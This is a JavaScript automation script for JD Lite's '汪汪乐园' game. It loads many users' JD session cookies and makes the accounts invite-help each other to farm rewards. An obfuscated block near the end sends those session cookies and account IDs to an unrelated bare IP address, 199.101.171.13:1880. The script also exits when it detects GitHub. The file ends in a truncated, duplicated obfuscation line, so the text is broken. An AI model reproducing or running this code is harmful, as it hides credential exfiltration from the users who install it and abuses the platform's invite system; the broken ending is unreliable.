/*
#
京东极速App首页-汪汪乐园
17 6,16,20 * * * Sami_jd_wwlyzl.js
由于程序频繁提交JDAPI，导致游戏出现“火爆”现象,本自用程序已经解决次问题。
 */
const $ = new Env("Sami汪汪乐园助力")
const Ver = '20220619';
const JD_API_HOST = 'https://api.m.jd.com/client.action';
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
let cookiesArr = [], cookie = '',cookie1 = '',sharecookie = '';
let shareCodes = [];
!(async () => {
    await $.wait(1000);
    await VerCheck("wwlyzl",Ver);
    await $.wait(1000);
    requireConfig()
    await $.wait(5000);
    await getHelpCode();
    await $.wait(5000);
    await doHelp1();

})()  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

function sortJson(a,b){  
   return b.level-a.level;  
}  

function sortByKey(array, key) {
     return array.sort(function(a, b) {
         var x = a[key]; var y = b[key];
         return ((x > y) ? -1 : ((x < y) ? 1 : 0));
     });
}

async function doHelp1(){
    for (let i = 0; i < 20; i++) {
        flag = '0'
        cookie1 = cookiesArr[i]
        sharecookie = shareCodes[i]
        $.UserName = decodeURIComponent(cookie1.match(/pt_pin=([^; ]+)(?=;?)/) && cookie1.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index1 = i + 1;
        $.UserName1 =encodeURIComponent($.UserName)
        console.log(`\n账号【${$.index1}】${$.UserName} 助力信息`);
        for(let j = 0; j < 5; j++){
            data = await GetAllTask();
            for (let vo of  data.data) {
                let id=vo.id;
                let taskTitle=vo.taskTitle;
                let taskDoTimes=vo.taskDoTimes;
                if (id==610 && (taskDoTimes != 5 || taskDoTimes===null)){
                    console.log('**************************');
                    console.log('开始任务：'+taskTitle);
                    for (let ii = 0; ii < cookiesArr.length; ii++) {
                        cookie = cookiesArr[ii]
                        $.UserName2 = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
                        $.index = ii + 1;
                        $.UserName3 =encodeURIComponent($.UserName2)
                        console.log(ii +' '+ $.UserName2 + ' 开始助力 '+$.UserName)
                        await $.wait(1000);
                        data = await getHelpSign('getHelpStatus',$.UserName3,'0')
                        console.log(data)
                        if(data.success==true){
                            t2 = Date.now();
                            h5st = await GetInfo(`joyBaseInfo`,t2,`{"taskId":"610","inviteType":"1","inviterPin":"`+sharecookie+`","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName3);
                            data= await PostTask("joyBaseInfo",`{"taskId":"610","inviteType":"1","inviterPin":"`+sharecookie+`","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,t2,encodeURIComponent(h5st))
                            //console.log(data);
                            if(data.data?.helpState==0){
                               //data = await getHelpSign('setHelpStatus',$.UserName1,'1')
                                console.log('自己不能给自己助力！');
                            }
                            if(data.data?.helpState==3){
                                data1 = await getHelpSign('setHelpStatus',$.UserName3,'1')
                                console.log('助力次数已经用完或者火爆了！');
                                //console.log(data1)
                            }
                            if(data.data?.helpState==1){
                                data1 = await getHelpSign('setHelpStatus',$.UserName3,'1')
                                console.log('助力成功！');
                                await $.wait(5000);
                                await eveDayChack("apTaskDrawAward",id,"SHARE_INVITE",taskTitle);
                                await $.wait(5000);
                                break;
                            }
                            await $.wait(10000);
                        }else{
                            console.log('助力次数已经用完！');
                        }
                    }
                    
                }
                if (id==610 && taskDoTimes == 5){
                    flag = '1'
                }
            }
            if (flag == '1'){
                console.log('任务结果：邀请任务全部完成');
                break;
            }
            
        }
    }
        
        
}



async function getHelpCode(){
    for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.UserName1 =encodeURIComponent($.UserName)
        console.log(`\n账号【${$.index}】${$.UserName} 汪汪乐园互助码信息`);
        data = await getHelpSign('getHelpSign',$.UserName1,'0')
        //console.log(data)
        if(data.helpCode=='0'){
            t2 = Date.now();
            h5st = await GetInfo(`joyBaseInfo`,t2,`{"taskId":"","inviteType":"","inviterPin":"","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName1);
            data= await PostTask("joyBaseInfo",`{"taskId":"","inviteType":"","inviterPin":"","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,t2,encodeURIComponent(h5st))
            //console.log(data.data?.invitePin)
            if(data.data?.invitePin != undefined){
                data = await getHelpSign('setHelpSign',$.UserName1,data.data?.invitePin)
                console.log(`📣📣📣互助码: `+ data.helpCode);
                shareCodes.push(data.helpCode);
                await $.wait(5000);
            }else{
                 console.log(`📣📣📣互助码: `+  ` 获取失败 `);
            }
        }else{
            console.log(`📣📣📣互助码:`+data.helpCode);
            shareCodes.push(data.helpCode);
            //console.log(shareCodes.length)
        }
        
    }
}
function eveDayChack(functionId,taskId,taskType,taskTitle) {
    return new Promise(async resolve => {
        const options = {
            url: `https://api.m.jd.com/`,
            body:`functionId=${functionId}&body={"taskType":"${taskType}","taskId":${taskId},"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1644236536442&appid=activities_platform`,
            headers: {
                "referer": "https://joypark.jd.com/",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookie1,
                "User-Agent": ua
            }
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`)
                    console.log(`${$.name} API请求失败，请检查网路重试`)
                } else {
                    if (data) {
                        
                        data = JSON.parse(data);
                        //$.dataJson = (data);
                        //{"success":true,"code":0,"errMsg":null,"data":[{"id":478,"taskTitle":"下单任务","taskType":"ORDER_MARK","taskLimitTimes":5,"taskShowTitle":"下单立赢大量汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"注意：若产生退货等虚假下单行，奖励将收回","awardIconUrl":null,"awardGivenNumber":"75000","grantStandard":0}],"taskDoTimes":0,"taskShowRank":1,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":null,"timePeriod":null,"forwardUrl":"https://pro.m.jd.com/jdlite/active/32ESeTAGi8yv2ZNZ8P5irfX1cHEp/index.html"},{"id":264,"taskTitle":"汪汪乐园签到","taskType":"SIGN","taskLimitTimes":1,"taskShowTitle":"每日签到得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"完成可获得大量汪币奖励","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":3,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":null,"timePeriod":null,"forwardUrl":null},{"id":481,"taskTitle":"汪汪乐园浏览会场","taskType":"BROWSE_CHANNEL","taskLimitTimes":5,"taskShowTitle":"逛会场得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"逛会场可得大量汪币","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":2147483647,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":0,"timePeriod":null,"forwardUrl":null},{"id":483,"taskTitle":"汪汪乐园浏览商品","taskType":"BROWSE_PRODUCT","taskLimitTimes":5,"taskShowTitle":"逛商品得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"逛商品可得大量汪币","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":2147483647,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":0,"timePeriod":null,"forwardUrl":null}]}
                            if(functionId==="apTaskDrawAward"){
                                $.log(taskTitle +`: 任务完成！` );
                            }
                            
                    } else {
                        console.log(`京东服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve(data);
            }
        })
    })
}


function GetAllTask() {
    return new Promise(async resolve => {
        const options = {
            url: `https://api.m.jd.com/`,
            body:`functionId=apTaskList&body={"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1644236293058&appid=activities_platform`,
            headers: {
                "referer": "https://joypark.jd.com/",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookie1,
                "User-Agent": ua
            }
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`)
                    console.log(`${$.name} API请求失败，请检查网路重试`)
                } else {
                    if (data) {
                        data = JSON.parse(data);
                        //{"success":true,"code":0,"errMsg":null,"data":[{"id":478,"taskTitle":"下单任务","taskType":"ORDER_MARK","taskLimitTimes":5,"taskShowTitle":"下单立赢大量汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"注意：若产生退货等虚假下单行，奖励将收回","awardIconUrl":null,"awardGivenNumber":"75000","grantStandard":0}],"taskDoTimes":0,"taskShowRank":1,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":null,"timePeriod":null,"forwardUrl":"https://pro.m.jd.com/jdlite/active/32ESeTAGi8yv2ZNZ8P5irfX1cHEp/index.html"},{"id":264,"taskTitle":"汪汪乐园签到","taskType":"SIGN","taskLimitTimes":1,"taskShowTitle":"每日签到得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"完成可获得大量汪币奖励","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":3,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":null,"timePeriod":null,"forwardUrl":null},{"id":481,"taskTitle":"汪汪乐园浏览会场","taskType":"BROWSE_CHANNEL","taskLimitTimes":5,"taskShowTitle":"逛会场得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"逛会场可得大量汪币","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":2147483647,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":0,"timePeriod":null,"forwardUrl":null},{"id":483,"taskTitle":"汪汪乐园浏览商品","taskType":"BROWSE_PRODUCT","taskLimitTimes":5,"taskShowTitle":"逛商品得汪币","taskImagUrl":"","shareMainTitle":"","shareSubTitle":"","configBaseList":[{"awardName":"WANGCOIN","awardTitle":"逛商品可得大量汪币","awardIconUrl":null,"awardGivenNumber":"6250","grantStandard":0}],"taskDoTimes":0,"taskShowRank":2147483647,"taskSourceUrl":null,"taskFinished":false,"extendInfo1":null,"canDrawAwardNum":null,"timeControlSwitch":0,"timePeriod":null,"forwardUrl":null}]}
                        
                            //$.log(`京豆抽奖: ` + data.promptMsg);
                    } else {
                        console.log(`京东服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve(data);
            }
        })
    })
}


//apDoTask
function apDoTask(functionId,taskId,itemId,taskType) {
    return new Promise(async resolve => {
        const options = {
            url: `https://api.m.jd.com/`,
            body:`functionId=${functionId}&body={"taskType":"${taskType}","taskId":${taskId},"channel":4,"linkId":"LsQNxL7iWDlXUs6cFl-AAg","itemId":"${itemId}"}&_t=1644642345582&appid=activities_platform`,
            headers: {
                "referer": "https://joypark.jd.com/",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookie,
                "User-Agent": ua
            }
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`)
                    console.log(`${$.name} API请求失败，请检查网路重试`)
                } else {
                    if (data) {
                        data = JSON.parse(data);
                        //console.log(data)
                        
                        //{    "code": 0,    "data": {        "status": {            "activityCode": null,            "activityMsg": null,            "alreadyGranted": null,            "awardInfo": null,            "canDrawAwardNum": null,            "finishNeed": 5,            "finished": false,            "userFinishedTimes": 3        },        "taskItemList": [            {                "itemId": "https://pro.m.jd.com/jdlite/active/3qRAXpNehcsUpToARD9ekP4g6Jhi/index.html?babelChannel=ttt6",                "itemName": "品牌好货 官方补贴 ",                "itemParam": "",                "itemPic": "",                "itemType": "1"            },            {                "itemId": "https://pro.m.jd.com/mall/active/vN4YuYXS1mPse7yeVPRq4TNvCMR/index.html?babelChannel=ttt6",                "itemName": "发现好物 9.9好货 ",                "itemParam": "",                "itemPic": "",                "itemType": "1"            }        ]    },    "errMsg": "success",    "success": true}
                        
                            
                    } else {
                        console.log(`京东服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve(data);
            }
        })
    })
}
//https://api.m.jd.com/?functionId=joyList&body={%22linkId%22:%22LsQNxL7iWDlXUs6cFl-AAg%22}&t=1652275935262&appid=activities_platform&client=H5&clientVersion=1.0.0&h5st=20220511213215262%3B6237189232500324%3Be18ed%3Btk02w73411b1018nH31FhRUvO2WVVKOdtVENTV4acG9sCLeeGjC43o57hQZGKGxXLEqtEvu13kcU%2FHv2HMjmSkZX2Ms0%3Bc2170c36dead59ae29f9de877f656394aa0a17e94ede41cd0352bb46d5dd4eff%3B3.0%3B1652275935262&cthr=1
// h5st = await GetInfo(`joyList`,Date.now(),`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
function GetTask(functionId,body,t,h5st) {
    return new Promise(async resolve => {
        const options = {
            url: `https://api.m.jd.com/?functionId=`+functionId+`&body=`+body+`&t=`+t+`&appid=activities_platform&client=H5&clientVersion=1.0.0&h5st=`+h5st+`&cthr=1`,
            //url:'https://api.m.jd.com/?functionId=joyList&body={%22linkId%22:%22LsQNxL7iWDlXUs6cFl-AAg%22}&t=1652275935262&appid=activities_platform&client=H5&clientVersion=1.0.0&h5st=20220511213215262%3B6237189232500324%3Be18ed%3Btk02w73411b1018nH31FhRUvO2WVVKOdtVENTV4acG9sCLeeGjC43o57hQZGKGxXLEqtEvu13kcU%2FHv2HMjmSkZX2Ms0%3Bc2170c36dead59ae29f9de877f656394aa0a17e94ede41cd0352bb46d5dd4eff%3B3.0%3B1652275935262&cthr=1',
            headers: {
                "Origin": "https://joypark.jd.com",
                //"Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookie,
                "User-Agent": ua
            }
        }
        $.get(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`)
                    console.log(`${$.name} API请求失败，请检查网路重试`)
                } else {
                    if (data) {
                        data = JSON.parse(data);

                    } else {
                        console.log(`京东服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve(data);
            }
        })
    })
}

function PostTask(functionId,body,t,h5st) {
    return new Promise(async resolve => {
        const options = {
            url:'https://api.m.jd.com',
            headers: {
                "Origin": "https://joypark.jd.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookie,
                "User-Agent": ua
            },
            body:`functionId=`+functionId+`&body=`+body+`&t=`+t+`&appid=activities_platform&h5st=`+h5st+`&cthr=1&client=H5&clientVersion=1.0.0&appid=activities_platform`
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`)
                    console.log(`${$.name} API请求失败，请检查网路重试`)
                } else {
                    if (data) {
                        data = JSON.parse(data);

                    } else {
                        console.log(`京东服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve(data);
            }
        })
    })
}

function requireConfig() {
    return new Promise(resolve => {
        notify = $.isNode() ? require('./sendNotify') : '';
        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
        if ($.isNode()) {
            Object.keys(jdCookieNode).forEach((item) => {
                if (jdCookieNode[item]) {
                    cookiesArr.push(jdCookieNode[item])
                }
            })
            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
        } else {
            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
        }
        console.log(`共${cookiesArr.length}个京东账号\n`)
        //resolve()
    })
}

function gettimestamp() {
  let time = new Date().getTime();
  return `${time}`;
}


function random(min, max) {
  let num = Math.floor(Math.random() * (max - min)) + min;
  return `"${num}"`;
}


function randomString(e) {
    e = e || 32;
    let t = "abcdefhijkmnprstwxyz2345678",
        a = t.length,
        n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}

function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}


var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe034b=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x77\x77\x6C\x79\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getBodySign(_0x285ex2,_0x285ex3){return  new Promise((_0x285ex4)=>{$[__Oxe034b[0x5]]({url:`${__Oxe034b[0x0]}${_0x285ex2}${__Oxe034b[0x1]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x285ex3,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x285ex5,_0x285ex6,_0x285ex7)=>{try{_0x285ex7= JSON[__Oxe034b[0x2]](_0x285ex7)}catch(e){$[__Oxe034b[0x4]](__Oxe034b[0x3],e)}finally{_0x285ex4(_0x285ex7)}})})}(function(_0x285ex8,_0x285ex9,_0x285exa,_0x285exb,_0x285exc,_0x285exd){_0x285exd= __Oxe034b[0x6];_0x285exb= function(_0x285exe){if( typeof alert!== _0x285exd){alert(_0x285exe)};if( typeof console!== _0x285exd){console[__Oxe034b[0x7]](_0x285exe)}};_0x285exa= function(_0x285exf,_0x285ex8){return _0x285exf+ _0x285ex8};_0x285exc= _0x285exa(__Oxe034b[0x8],_0x285exa(_0x285exa(__Oxe034b[0x9],__Oxe034b[0xa]),__Oxe034b[0xb]));try{_0x285ex8= __encode;if(!( typeof _0x285ex8!== _0x285exd&& _0x285ex8=== _0x285exa(__Oxe034b[0xc],__Oxe034b[0xd]))){_0x285exb(_0x285exc)}}catch(e){_0x285exb(_0x285exc)}})({})

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var 